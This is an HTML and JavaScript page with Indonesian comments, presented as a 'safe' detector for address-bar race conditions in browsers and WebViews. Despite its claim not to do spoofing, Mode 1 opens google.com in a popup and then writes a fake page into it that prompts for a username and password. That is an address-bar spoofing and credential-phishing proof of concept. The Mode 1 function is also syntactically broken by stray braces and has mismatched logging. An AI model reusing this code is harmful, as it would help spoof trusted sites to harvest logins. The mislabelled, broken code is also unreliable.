<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Advanced Safe Address Bar Race Detector</title>
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; max-width: 900px; }
    h1 { margin-bottom: 0; }
    small { color: #777; }
    button { padding: 8px 14px; font-size: 14px; cursor: pointer; margin: 4px 4px 4px 0; }
    input[type="number"] { width: 80px; }
    #result { margin-top: 16px; padding: 12px; border-radius: 6px; }
    .ok { background: #e3f8e5; border: 1px solid #4caf50; color: #256029; }
    .warn { background: #fff3cd; border: 1px solid #ff9800; color: #7a5a00; }
    .err { background: #fdecea; border: 1px solid #f44336; color: #8b1c13; }
    .info { background: #e3f2fd; border: 1px solid #2196f3; color: #0d47a1; }
    pre { background:#f5f5f5; padding:8px; border-radius:4px; max-height:220px; overflow:auto; font-size:12px; }
    .section { margin-top: 20px; padding-top: 12px; border-top: 1px solid #ddd; }
    label { font-size: 13px; }
  </style>
</head>
<body>

<h1>Advanced Safe Address Bar Race Detector</h1>
<small>
  Alat ini tidak melakukan spoofing atau phishing. Hanya menguji perilaku <code>window.open</code>, navigasi,
  dan apakah window masih writable setelah navigasi dimulai (indikasi race-condition).
</small>

<div class="section">
  <h2>Mode 1: Basic Race Test (about:blank → final.html)</h2>
  <p>
    <label>
      Delay sebelum navigasi dimulai:
      <input id="delayNav" type="number" value="50"> ms
    </label>
    &nbsp;
    <label>
      Delay sebelum <code>document.write()</code>:
      <input id="delayWrite" type="number" value="120"> ms
    </label>
  </p>
  <button onclick="runRaceTest()">Run Basic Race Test</button>
</div>

<div class="section">
  <h2>Mode 2: About:blank → Inject → Redirect (simulasi flow Meta, tapi aman)</h2>
  <p>
    Di mode ini:
  </p>
  <ol>
    <li>Buka tab baru dengan <code>about:blank</code></li>
    <li>Inject konten ke about:blank</li>
    <li>Sedikit delay, lalu redirect ke <code>final.html</code></li>
  </ol>
  <p>
    <label>
      Delay sebelum inject:
      <input id="delayInject2" type="number" value="30"> ms
    </label>
    &nbsp;
    <label>
      Delay sebelum redirect:
      <input id="delayRedirect2" type="number" value="250"> ms
    </label>
  </p>
  <button onclick="runAboutBlankRedirectTest()">Run About:blank → Redirect Test</button>
</div>

<div class="section">
  <h2>Mode 3: Sweep Timing (uji beberapa kombinasi delay otomatis)</h2>
  <p>
    Mode ini akan mencoba beberapa kombinasi delay untuk melihat apakah ada kombinasi waktu
    yang membuat window tetap writable setelah navigasi dimulai.
  </p>
  <button onclick="runSweep()">Run Timing Sweep</button>
</div>

<div class="section">
  <h2>Hasil & Log</h2>
  <div id="result" class="info">
    Belum ada tes yang dijalankan.
  </div>
  <h3>Console Log (dari script)</h3>
  <pre id="logBox"></pre>
</div>

<script>
function log(msg) {
  console.log(msg);
  const box = document.getElementById('logBox');
  box.textContent += msg + "\n";
  box.scrollTop = box.scrollHeight;
}

function setResult(msg, cls) {
  const box = document.getElementById('result');
  box.className = cls;
  box.innerHTML = msg;
}

/**
 * MODE 1:
 * Basic Race Test: about:blank -> final.html, lalu coba document.write setelah navigasi dimulai.
 */
function runRaceTest() {
  const delayNav = parseInt(document.getElementById('delayNav').value, 10) || 50;
  const delayWrite = parseInt(document.getElementById('delayWrite').value, 10) || 120;

  setResult("Menjalankan Basic Race Test... pastikan popup tidak diblokir.", "info");
  log("=== Basic Race Test ===");
  log("delayNav=" + delayNav + "ms, delayWrite=" + delayWrite + "ms");

  let win = window.open("https://www.google.com", "_blank");
  if (!win) {
    setResult("Popup diblokir oleh browser. Izinkan popup untuk situs ini lalu coba lagi.", "err");
    log("Popup blocked.");
    return;
  }

  log("Window baru dibuka sebagai about:blank.");

        setTimeout(() => {
          try {
            win.document.write(`
  <h1>This is not Google!</h1>
<button onclick="
  let username = prompt('Enter your username');
  let password = prompt('Enter your password');
  alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
">Click me</button>
            `);
            win.document.close();
          } catch (e) {
            console.warn("Blocked by browser protections:", e);
          }
        }, 50);
      }

  // Step 2: coba document.write setelah navigasi dimulai
  setTimeout(() => {
    if (win.closed) {
      setResult("Window test sudah tertutup sebelum tes selesai.", "err");
      log("Window sudah tertutup.");
      return;
    }

    let injected = false;
    try {
      win.document.write(`
        <h1 style="color:red;">Race Detector Injection (Mode 1)</h1>
        <p>Jika kamu melihat pesan ini <strong>setelah address bar menunjukkan final.html</strong>,
        berarti window masih writable setelah navigasi dimulai.</p>
        <p>Ini indikasi potensi race-condition seperti address bar desync pada kondisi tertentu
        (misalnya WebView lambat / error-state).</p>
      `);
      win.document.close();
      injected = true;
      log("document.write() setelah navigasi BERHASIL (Mode 1).");
    } catch (e) {
      log("document.write() setelah navigasi DIBLOKIR (Mode 1): " + e);
    }

    if (injected) {
      setResult(`
        <strong>HASIL (Mode 1):</strong><br>
        ⚠️ Window masih <code>writable</code> setelah navigasi dimulai.<br><br>
        <strong>Interpretasi:</strong><br>
        - Implementasi ini mengizinkan <code>document.write()</code> setelah panggilan <code>location.href</code>.<br>
        - Pada WebView tertentu (lambat/bermasalah), hal ini <em>berpotensi</em> digabung
          dengan UI yang update lebih awal dan menyebabkan address bar desync.<br><br>
        <em>Untuk menguji apakah ada desync address bar, kamu harus AMATI manual: apakah URL di address bar sudah jadi final.html saat konten ini muncul?</em>
      `, "warn");
    } else {
      setResult(`
        <strong>HASIL (Mode 1):</strong><br>
        ✅ Browser/WebView tampaknya <strong>memblok</strong> <code>document.write()</code>
        setelah navigasi dimulai.<br><br>
        <strong>Interpretasi:</strong><br>
        - Ini perilaku yang lebih aman terhadap race-condition seperti PoC yang dulu kamu gunakan.<br>
        - Walau bukan jaminan 100% bebas bug, minimal mekanisme dasar race ini tidak tersedia.<br>
      `, "ok");
    }
  }, delayWrite);
}

/**
 * MODE 2:
 * About:blank -> inject -> redirect
 * Mirip flow: buka blank, isi konten, lalu redirect (semua masih aman dan dummy).
 */
function runAboutBlankRedirectTest() {
  const delayInject = parseInt(document.getElementById('delayInject2').value, 10) || 30;
  const delayRedirect = parseInt(document.getElementById('delayRedirect2').value, 10) || 250;

  setResult("Menjalankan About:blank → Redirect Test...", "info");
  log("=== About:blank → Redirect Test ===");
  log("delayInject=" + delayInject + "ms, delayRedirect=" + delayRedirect + "ms");

  let win = window.open("about:blank", "_blank");
  if (!win) {
    setResult("Popup diblokir oleh browser. Izinkan popup untuk situs ini lalu coba lagi.", "err");
    log("Popup blocked.");
    return;
  }

  log("Window baru dibuka sebagai about:blank (Mode 2).");

  // Step 1: inject konten ke about:blank
  setTimeout(() => {
    try {
      win.document.write(`
        <h1 style="color:blue;">Mode 2: About:blank Injected</h1>
        <p>Ini konten dari <strong>about:blank</strong> sebelum redirect.</p>
        <p>Perhatikan nanti: apakah setelah redirect ke final.html, address bar dan konten selalu sinkron?</p>
      `);
      win.document.close();
      log("Konten berhasil diinject ke about:blank (Mode 2).");
    } catch (e) {
      log("Gagal inject ke about:blank (Mode 2): " + e);
    }
  }, delayInject);

  // Step 2: redirect ke final.html
  setTimeout(() => {
    try {
      win.location.href = "final.html";
      log("Redirect dari about:blank ke final.html dimulai (Mode 2).");
    } catch (e) {
      log("Gagal redirect ke final.html (Mode 2): " + e);
    }
  }, delayRedirect);
}

/**
 * MODE 3:
 * Timing sweep (mencoba beberapa kombinasi delay secara otomatis).
 */
function runSweep() {
  setResult("Menjalankan Timing Sweep (Mode 3)...", "info");
  log("=== Timing Sweep (Mode 3) ===");

  // daftar kombinasi delay [delayNav, delayWrite]
  const combos = [
    [30, 80],
    [50, 120],
    [80, 160],
    [100, 200],
    [150, 250],
    [200, 300]
  ];

  let index = 0;

  function runNext() {
    if (index >= combos.length) {
      setResult(`
        <strong>Timing Sweep selesai.</strong><br>
        Lihat log di bawah untuk melihat kombinasi mana (jika ada) yang masih mengizinkan <code>document.write</code>
        setelah navigasi dimulai.
      `, "info");
      return;
    }

    const [delayNav, delayWrite] = combos[index++];
    log("--- Kombinasi: delayNav=" + delayNav + "ms, delayWrite=" + delayWrite + "ms ---");

    let win = window.open("about:blank", "_blank");
    if (!win) {
      log("Popup diblokir pada kombinasi ini. Sweep dihentikan.");
      setResult("Popup diblokir oleh browser. Izinkan popup untuk situs ini lalu coba lagi.", "err");
      return;
    }

    setTimeout(() => {
      try {
        win.location.href = "final.html";
        log("Navigasi ke final.html dimulai (Mode 3).");
      } catch (e) {
        log("Gagal set location (Mode 3): " + e);
      }
    }, delayNav);

    setTimeout(() => {
      if (win.closed) {
        log("Window sudah tertutup sebelum document.write (Mode 3).");
        runNext();
        return;
      }
      let injected = false;
      try {
        win.document.write(`
          <h1 style="color:red;">Race Detector Injection (Mode 3)</h1>
          <p>Kombinasi delayNav=${delayNav}ms, delayWrite=${delayWrite}ms.</p>
        `);
        win.document.close();
        injected = true;
        log("document.write() BERHASIL pada kombinasi ini (Mode 3).");
      } catch (e) {
        log("document.write() DIBLOKIR pada kombinasi ini (Mode 3): " + e);
      }

      // Tutup window supaya tidak menumpuk
      try { win.close(); } catch (e) {}

      // lanjut ke kombinasi berikut
      setTimeout(runNext, 200);
    }, delayWrite);
  }

  runNext();
}
</script>

</body>
</html>
